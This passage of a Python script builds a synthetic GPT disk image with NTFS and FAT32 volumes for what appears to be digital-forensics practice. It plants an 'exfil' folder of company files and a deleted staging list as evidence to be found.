        chars = [units[i] | (units[i + 1] << 8) for i in range(0, len(units), 2)]
        parts = [chars[i:i + 13] for i in range(0, len(chars), 13)]
        for idx in range(len(parts), 0, -1):
            p = parts[idx - 1]
            if len(p) < 13:
                p = p + [0x0000] + [0xFFFF] * (12 - len(p))
            le = bytearray(32)
            le[0] = idx | (0x40 if idx == len(parts) else 0)
            for j, pos in enumerate([1, 3, 5, 7, 9, 14, 16, 18, 20, 22, 24, 28, 30]):
                le[pos:pos + 2] = u16(p[j])
            le[11] = 0x0F
            le[13] = chk
            if deleted:
                le[0] = 0xE5
            out += le
    if deleted:
        e[0] = 0xE5
    return bytes(out + e)


class FatVolume:
    def __init__(self, sectors: int, hidden: int, label: str, serial: int):
        self.sectors, self.hidden, self.label, self.serial = sectors, hidden, label, serial
        fat_sz = 1
        while True:
            clusters = (sectors - FAT_RESERVED - FAT_NFATS * fat_sz) // FAT_SPC
            need = align((clusters + 2) * 4, SECTOR) // SECTOR
            if need <= fat_sz:
                break
            fat_sz = need
        self.fat_sz, self.clusters = fat_sz, clusters
        self.data_start = FAT_RESERVED + FAT_NFATS * fat_sz
        self.img = bytearray(sectors * SECTOR)
        self.fat = [0] * (clusters + 2)
        self.fat[0], self.fat[1] = 0x0FFFFFF8, 0x0FFFFFFF
        self.next = 2

    def cl_off(self, cl: int) -> int:
        return (self.data_start + (cl - 2) * FAT_SPC) * SECTOR

    def store(self, data: bytes, chain=True) -> int:
        n = max(1, align(len(data), SECTOR * FAT_SPC) // (SECTOR * FAT_SPC))
        first = self.next
        self.next += n
        for i in range(n):
            cl = first + i
            if chain:
                self.fat[cl] = 0x0FFFFFFF if i == n - 1 else cl + 1
        o = self.cl_off(first)
        self.img[o:o + len(data)] = data
        return first

    def boot(self, free: int, next_free: int) -> None:
        b = bytearray(SECTOR)
        b[0:3] = b"\xEB\x58\x90"
        b[3:11] = b"MSDOS5.0"
        b[11:13] = u16(SECTOR)
        b[13] = FAT_SPC
        b[14:16] = u16(FAT_RESERVED)
        b[16] = FAT_NFATS
        b[21] = 0xF8
        b[24:26] = u16(63)
        b[26:28] = u16(255)
        b[28:32] = u32(self.hidden)
        b[32:36] = u32(self.sectors)
        b[36:40] = u32(self.fat_sz)
        b[44:48] = u32(2)  # root cluster
        b[48:50] = u16(1)  # FSInfo
        b[50:52] = u16(6)  # backup boot sector
        b[64] = 0x80
        b[66] = 0x29
        b[67:71] = u32(self.serial)
        b[71:82] = self.label.ljust(11).encode("ascii")
        b[82:90] = b"FAT32   "
        b[510:512] = b"\x55\xAA"
        fsi = bytearray(SECTOR)
        fsi[0:4] = u32(0x41615252)
        fsi[484:488] = u32(0x61417272)
        fsi[488:492] = u32(free)
        fsi[492:496] = u32(next_free)
        fsi[508:512] = u32(0xAA550000)
        third = bytearray(SECTOR)
        third[510:512] = b"\x55\xAA"
        for base in (0, 6):
            self.img[(base) * SECTOR:(base + 1) * SECTOR] = b
            self.img[(base + 1) * SECTOR:(base + 2) * SECTOR] = fsi
            self.img[(base + 2) * SECTOR:(base + 3) * SECTOR] = third

    def finish(self) -> bytes:
        fat = b"".join(u32(v) for v in self.fat)
        for i in range(FAT_NFATS):
            o = (FAT_RESERVED + i * self.fat_sz) * SECTOR
            self.img[o:o + len(fat)] = fat
        free = sum(1 for v in self.fat[2:] if v == 0)
        self.boot(free, self.next)
        return bytes(self.img)


def build_fat32(sectors: int, hidden: int) -> bytes:
    v = FatVolume(sectors, hidden, "DATA", 0x7C3A_91E4)
    t_fmt = utc(2026, 3, 2, 8, 40, 12)

    root_cl = v.store(bytes(SECTOR))  # root directory (cluster 2)
    svi_cl = v.store(bytes(SECTOR))
    exfil_cl = v.store(bytes(SECTOR))

    idx_guid = "{5E2F7C1A-93B4-4D8E-A6F1-0C9D4B7E2A31}".encode("utf-16-le")
    t_svi = utc(2026, 3, 2, 8, 41, 3)
    idx_cl = v.store(idx_guid)

    t_mk = utc(2026, 9, 14, 10, 19, 48)
    files = [
        ("payroll_2026-08.csv", PAYROLL, utc(2026, 9, 14, 10, 20, 11, 340000)),
        ("vendor_master.csv", VENDORS, utc(2026, 9, 14, 10, 20, 12, 90000)),
        ("Q3_forecast_board_pack.zip", FORECAST_ZIP, utc(2026, 9, 14, 10, 20, 13, 520000)),
    ]
    placed = [(n, v.store(d), len(d), t) for n, d, t in files]
    # Deleted staging list: clusters freed in the FAT, bytes left behind.
    del_name, del_t = "exfil_filelist.txt", utc(2026, 9, 14, 10, 21, 30, 0)
    del_cl = v.store(FILELIST, chain=False)

    # Root: volume label, System Volume Information, exfil.
    taken: set[str] = set()
    root = bytearray()
    lab = bytearray(32)
    lab[0:11] = v.label.ljust(11).encode("ascii")
    lab[11] = 0x08
    d, t, _ = dos_dt(t_fmt)
    lab[22:24], lab[24:26] = u16(t), u16(d)
    root += lab
    root += dir_entries("System Volume Information", 0x16, svi_cl, 0, t_svi, taken)
    root += dir_entries("exfil", 0x10, exfil_cl, 0, t_mk, taken)
    v.img[v.cl_off(root_cl):v.cl_off(root_cl) + len(root)] = root

    def dot_entries(own: int, parent: int, dt: datetime) -> bytes:
        dd, tt, tenth = dos_dt(dt)
        out = bytearray()
        for nm, cl in ((b".          ", own), (b"..         ", 0 if parent == 2 else parent)):
            e = bytearray(32)
            e[0:11] = nm
            e[11] = 0x10
            e[13] = tenth
            e[14:16], e[16:18], e[18:20] = u16(tt), u16(dd), u16(dd)
            e[20:22], e[26:28] = u16(cl >> 16), u16(cl & 0xFFFF)
            e[22:24], e[24:26] = u16(tt), u16(dd)
            out += e
        return bytes(out)

    taken = set()
    svi = dot_entries(svi_cl, root_cl, t_svi) + dir_entries(
        "IndexerVolumeGuid", 0x06, idx_cl, len(idx_guid), t_svi, taken)
    v.img[v.cl_off(svi_cl):v.cl_off(svi_cl) + len(svi)] = svi

    taken = set()
    ex = bytearray(dot_entries(exfil_cl, root_cl, t_mk))
    for n, cl, size, t in placed:
        ex += dir_entries(n, 0x20, cl, size, t, taken)
    ex += dir_entries(del_name, 0x20, del_cl, len(FILELIST), del_t, taken, deleted=True)
    v.img[v.cl_off(exfil_cl):v.cl_off(exfil_cl) + len(ex)] = ex

    return v.finish()


# ==================================================================== GPT ===

TYPE_MSR = "E3C9E316-0B5C-4DB8-817D-F92DF00215AE"
TYPE_BASIC = "EBD0A0A2-B9E5-4433-87C0-68B6B72699C7"
DISK_GUID = "6B1D2A4E-0F3C-4E7A-9C58-2D7F31A0B6C4"


def gpt_entry(type_g: str, uniq: str, first: int, last: int, name: str, attrs: int = 0) -> bytes:
    e = bytearray(128)
    e[0:16] = guid(type_g)
    e[16:32] = guid(uniq)
    e[32:40] = u64(first)
    e[40:48] = u64(last)
    e[48:56] = u64(attrs)
    n = name.encode("utf-16-le")[:72]
    e[56:56 + len(n)] = n
    return bytes(e)


def gpt_header(my: int, alt: int, first_usable: int, last_usable: int, entries_lba: int,
               entries_crc: int) -> bytes:
    h = bytearray(92)
    h[0:8] = b"EFI PART"
    h[8:12] = u32(0x00010000)
    h[12:16] = u32(92)
    h[24:32] = u64(my)
    h[32:40] = u64(alt)
    h[40:48] = u64(first_usable)
    h[48:56] = u64(last_usable)
    h[56:72] = guid(DISK_GUID)
    h[72:80] = u64(entries_lba)
    h[80:84] = u32(128)
    h[84:88] = u32(128)
    h[88:92] = u32(entries_crc)
    h[16:20] = u32(zlib.crc32(bytes(h)))
    return bytes(h) + bytes(SECTOR - 92)


def build_disk() -> tuple[bytes, list[tuple[str, int, int]]]:
    ALIGN = 128  # 64 KiB alignment keeps the demo image small
    msr = (128, 128)  # (start, sectors)
    ntfs = (msr[0] + msr[1], 2048)  # 1 MiB
    gap = 128  # 64 KiB of unpartitioned space
    fat = (align(ntfs[0] + ntfs[1] + gap, ALIGN), 1024)  # 512 KiB
    total = fat[0] + fat[1] + 33 + 31  # backup GPT + slack to a 32 KiB boundary
    total = align(total, 64)
    disk = bytearray(total * SECTOR)

    # Protective MBR.
    mbr = bytearray(SECTOR)
    pe = bytearray(16)
    pe[1:4] = b"\x00\x02\x00"
    pe[4] = 0xEE
    pe[5:8] = b"\xFF\xFF\xFF"
    pe[8:12] = u32(1)
    pe[12:16] = u32(min(total - 1, 0xFFFFFFFF))
    mbr[446:462] = pe
    mbr[510:512] = b"\x55\xAA"
    disk[0:SECTOR] = mbr

    parts = [
        gpt_entry(TYPE_MSR, "A1C0E3F2-5B7D-4C19-8E26-3F4A5B6C7D80", msr[0], msr[0] + msr[1] - 1,
                  "Microsoft reserved partition", attrs=0),
        gpt_entry(TYPE_BASIC, "C3D2B1A0-9F8E-4D7C-8B6A-5E4F3D2C1B0A", ntfs[0], ntfs[0] + ntfs[1] - 1,
                  "Basic data partition"),
        gpt_entry(TYPE_BASIC, "0F1E2D3C-4B5A-4968-8776-A5B4C3D2E1F0", fat[0], fat[0] + fat[1] - 1,
                  "Basic data partition"),
    ]
    entries = b"".join(parts) + bytes(128 * (128 - len(parts)))
    ecrc = zlib.crc32(entries)
    last_usable = total - 34
    disk[SECTOR:2 * SECTOR] = gpt_header(1, total - 1, 34, last_usable, 2, ecrc)
    disk[2 * SECTOR:34 * SECTOR] = entries
    disk[(total - 33) * SECTOR:(total - 1) * SECTOR] = entries
    disk[(total - 1) * SECTOR:] = gpt_header(total - 1, 1, 34, last_usable, total - 33, ecrc)

    vol = build_ntfs(ntfs[1], ntfs[0])
    disk[ntfs[0] * SECTOR:ntfs[0] * SECTOR + len(vol)] = vol
    vol = build_fat32(fat[1], fat[0])
    disk[fat[0] * SECTOR:fat[0] * SECTOR + len(vol)] = vol

    layout = [("MSR", *msr), ("NTFS C:", *ntfs), ("FAT32 E:", *fat)]
    return bytes(disk), layout


def main() -> None:
    out_dir = Path(sys.argv[1] if len(sys.argv) > 1 else "public/samples")
    out_dir.mkdir(parents=True, exist_ok=True)
    disk, layout = build_disk()
    path = out_dir / "fin-wks-07.img"
    path.write_bytes(disk)
    print(f"wrote {path} ({len(disk):,} bytes)")
    for name, start, n in layout:
        print(f"  {name:<9} LBA {start:>5} .. {start + n - 1:>5}  ({n * SECTOR // 1024} KiB)")


if __name__ == "__main__":
    main()
